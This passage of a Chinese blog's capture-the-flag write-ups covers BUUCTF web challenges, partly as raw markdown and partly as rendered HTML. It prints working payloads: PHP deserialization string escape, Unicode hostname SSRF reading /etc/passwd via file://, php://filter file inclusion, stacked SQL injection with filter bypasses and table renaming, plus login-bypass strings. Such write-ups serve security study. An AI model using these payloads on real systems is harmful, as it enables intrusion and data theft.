'';\n\t$config['database'] = '';\n\t$flag = '';\n?>\n```\n\n~~下载的源码肯定不会把flag直接给你~~，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：`filter`\n\n```php\n$username = parent::filter($username);\n$password = parent::filter($password);\n```\n\n跟进一下\n\n```php\npublic function filter($string) {\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\n过滤`_`，select、insert、update、delete、where会被替换成`hacker`，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用[PHP反序列化字符串逃逸](https://my.oschina.net/u/3076320/blog/4372683)，序列化的结尾是`\";}`可以手动构造闭合。\n\n现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工\n\n先上payload\n\n```code\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。\n\n受到了这位师傅的博客[[0CTF 2016]piapiapia](https://blog.csdn.net/weixin_44077544/article/details/102703489)，我尝试了下`$profile`属性其实是一个**关联数组**，是键值对形式的，并且字符串可能是嵌套起来的，形如\n\n```php\n<?php\nclass profile{\n\tpublic $file = 'a:2:{s:8:\"nickname\";s:5:\"where\";s:5:\"photo\";s:3:\"233\";}';\n\tpublic $upload =\"2333\";\n}\n$s1= new profile();\necho serialize($s1);\n```\n\n结果是\n\n```php\nO:7:\"profile\":2:{s:4:\"file\";s:56:\"a:2:{s:8:\"nickname\";s:15:\"where\";s:5:\"photo\";s:3:\"233\";}\";s:6:\"upload\";s:4:\"2333\";}\n```\n\n这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png)\n\n报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。\n\n查看页面的图片内容\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png)\n\nbase64解码\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png)\n\n\n\n---\n\n# [SUCTF 2019]Pythonginx\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png)\n\n整理一下源码\n\n```python\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n三个if都是判断`host == 'suctf.cc'`，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断`==`，回过头来注意到了**第二个**if中有`newhost.append(h.encode('idna').decode('utf-8'))`进行了一波编码，那么问题就出在了这里。\n\n所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母`c`，那么我就找第一个字母`s`验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，**需要多试几个**。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png)\n\n我选出的是这个字符`𝐬`，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：\n\n```code\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd\n```\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png)\n\nflag并不在其中，并且也不再根目录下，根据题目中有`nginx`应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：\n\n> 配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf\n>\n> 主配置文件：/etc/nginx/conf/nginx.conf\n>\n> 管理脚本：/usr/lib64/systemd/system/nginx.service\n>\n> 模块：/usr/lisb64/nginx/modules\n>\n> 应用程序：/usr/sbin/nginx\n>\n> 程序默认存放位置：/usr/share/nginx/html\n>\n> 日志默认存放位置：/var/log/nginx\n\n读配置文件\n\n```code\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png)\n\n读flag\n\n```\n/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png)\n\n\n\n参考的博客链接：\n\nhttps://www.xmsec.cc/suctf19-wp/\n\nhttps://xz.aliyun.com/t/6042#toc-24\n\nhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\n\n---\n\n# [BSidesCF 2020]Had a bad day\n\n看这个标题我推一下OWRLD ORDER的[Have a nice day](https://www.bilibili.com/video/BV1Bb411K7Gd)\n\n页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为\n\n```url\n/index.php?category=woofers\n```\n\n尝试输入flag会显示\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png)\n\n只能有`woofers`和`meowers`可以通过，尝试了下php的`filter`伪协议读文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png)\n\n读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：\n\n```html\n<center>\n\t<h4> Woof! Woof! </h4>\n</center>\n<img style=\"width:100%\" src=\"img/dog/<?php echo rand(1,10)?>.jpg\">\n```\n\n多尝试以后发现可以读`index`，下面是主要的源码：\n\n```php\n<?php\n$file = $_GET['category'];\nif(isset($file)){\nif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n\t\t\t\t\t\tinclude ($file . '.php');\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t?>\n```\n\n可以看到if判断中需要字符串包含`woofers`、`meowers`、`index`，那么我们只需要在filter伪协议中插入字符串绕过判断即可。\n\n**需要知道的**：filter可以设定一个或多个过滤器名称，以管道符`\\`分隔，所以构造payload：\n\n```\n/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag\n```\n\n读出来以后解密即可获得flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png)\n\n搜索的时候学到了一个其他的截断\n\n```\nzip://test.zip#hello.html.php\n```\n\n代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。\n\n","slug":"BUUCTF寒假刷题-Web","published":1,"updated":"2021-12-30T09:42:54.174Z","_id":"ckrr3fa5b0041hotc618l2p1c","comments":1,"layout":"post","photos":[],"link":"","content":"<p>寒假横向刷题（尽量）<br><a href=\"https://buuoj.cn/challenges#\">BUUCTF</a><br>💗🧡💛💚💙💜🤎🖤🤍<br><strong>题都写这一个里面了，可以先用<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨</strong> </p>\n<h1 id=\"2021-01-15\"><a href=\"#2021-01-15\" class=\"headerlink\" title=\"2021.01.15\"></a>2021.01.15</h1><h1 id=\"HCTF-2018-WarmUp\"><a href=\"#HCTF-2018-WarmUp\" class=\"headerlink\" title=\"[HCTF 2018]WarmUp\"></a>[HCTF 2018]WarmUp</h1><p>进到靶机一个硕大的滑稽，查看源码有提示source.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">    class emmm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public static function checkFile(&amp;$page)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class=\"line\">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class=\"line\">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if (in_array($page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $page,</span><br><span class=\"line\">                0,</span><br><span class=\"line\">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            if (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = urldecode($page);</span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $_page,</span><br><span class=\"line\">                0,</span><br><span class=\"line\">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            if (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>发现白名单有source.php和hint.php，先去查看一下hint.php</p>\n<blockquote>\n<p>flag not here, and flag in ffffllllaaaagggg</p>\n</blockquote>\n<p>分析源码</p>\n<ul>\n<li>判断<code>$_REQUEST[&#39;file&#39;]</code>对象为空且为字符串</li>\n<li>执行emmm类中的<strong>checkFile</strong>方法判断是否在白名单（确保函数返回是true）</li>\n<li>文件包含</li>\n</ul>\n<p>checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。</p>\n<ol>\n<li>第一种</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n\n<p>字符串截取将原字符串尾部加上<code>?</code>再截取第一个<code>?</code>之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的<code>../</code>返回上级目录。</p>\n<ol start=\"2\">\n<li> 第二种</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n\n<p>将第一种payload使用urlencode编码即可。</p>\n<hr>\n<h1 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png\"></p>\n<p>根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>这道题使用的是堆叠注入，原理</p>\n<blockquote>\n<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n</blockquote>\n<p>查看数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show databases;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png\"></p>\n<p>查看当前库下的表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show tables;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png\"></p>\n<p>查看两张表字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show columns from words;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png\"></p>\n<p>还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;desc `1919810931114514`;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png\"></p>\n<p>找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是<strong>word</strong>表中的字段，而flag在<strong>1919810931114514</strong>表中。</p>\n<p>网上找到的两种方法，分别是修改表名和使用预处理语句。</p>\n<ol>\n<li>使用<a href=\"https://www.cnblogs.com/geaozhang/p/9891338.html\">预处理</a>语句</li>\n</ol>\n<p>因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char(115,101,108,101,99,116)</span><br></pre></td></tr></table></figure>\n\n<p>根据预处理语句格式构造payload</p>\n<ul>\n<li>创建一个<strong>sqli</strong>字符串值为查询sql语句，使用预处理语句赋值并执行。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;* from `1919810931114514`&#x27;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>不使用变量</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;PREPARE sqli FROM CONCAT(&#x27;s&#x27;,&#x27;elect&#x27;,&#x27; * from `1919810931114514`&#x27;);EXECUTE sqli; #</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>还有一种</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SET @sqli = CONCAT(&#x27;s&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;e&#x27;,&#x27;c&#x27;,&#x27;t&#x27;,&#x27; * from `1919810931114514`&#x27;);PREPARE haha FROM@sqli ;EXECUTE haha; #</span><br></pre></td></tr></table></figure>\n\n<p>主要区别在于过滤的绕过方式，不要拘泥于一种方式。</p>\n<ol start=\"2\">\n<li>修改表名</li>\n</ol>\n<p>修改表名的思路是：默认查询的是<strong>word</strong>表第一个字段，所以把<strong>word</strong>表修改为其他名称，将flag所在的<strong>1919810931114514</strong>表名修改为<strong>word</strong>。</p>\n<p>网上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>\n\n<p>自己构造的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #</span><br></pre></td></tr></table></figure>\n\n<p>之后执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>\n\n<p>查询表所有字段值即可。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png\"></p>\n<p>用户名密码，尝试万能密码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or 1=1 #</span><br><span class=\"line\">随便密码</span><br></pre></td></tr></table></figure>\n\n<p>一个万能密码的参考:<a href=\"https://www.cnblogs.com/pass-A/p/11134988.html\">https://www.cnblogs.com/pass-A/p/11134988.html</a></p>\n<hr>\n<h1 id=\"极客大挑战-2019-Havefun\"><a href=\"#极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"[极客大挑战 2019]Havefun\"></a>[极客大挑战 2019]Havefun</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png\"></p>\n<p>直接源码找到php代码。payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cat=dog</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png\"></p>\n<p>单引号无报错，尝试堆叠注入可以回显。</p>\n<p>和 [强网杯 2019]随便注这道题一样查库查表查字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases;</span><br><span class=\"line\">1;show tables;</span><br></pre></td></tr></table></figure>\n\n<p>但是执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;desc `Flag`;</span><br><span class=\"line\">1;show columns from Flag;</span><br></pre></td></tr></table></figure>\n\n<p>返回了”Nonono.“测试出被过滤了：desc、from、Flag。</p>\n<p>接下来的都是抄网上的预期解也是第一次见。</p>\n<p>比赛时源码泄露</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select $_GET[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>\n\n<p>非预期解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*,1 </span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-Include\"><a href=\"#ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Include\"></a>[ACTF2020 新生赛]Include</h1><p>不截图了，进入靶机只有一个<strong>tips</strong>等着被点。跳转以后看url中参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=flag.php</span><br></pre></td></tr></table></figure>\n\n<p>页面内容只有</p>\n<blockquote>\n<p>Can you find out the flag?</p>\n</blockquote>\n<p>立马想到使用php伪协议读文件内容。使用filter过滤器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=</span><br></pre></td></tr></table></figure>\n\n<p>解密得到flag</p>\n<hr>\n<h1 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png\"></p>\n<p>查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png\"></p>\n<p>查看源码SECRET跳转的是action.php。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png\"></p>\n<p>但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png\"></p>\n<p>stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。</p>\n<p>同样使用php伪协议filter过滤器读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>\n\n<p>解密得到网页源码，flag在其中。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h1><p>顶端の告诫：用 sqlmap 是没有灵魂的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png\"></p>\n<p>尝试万能密码（其实没卵用）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or 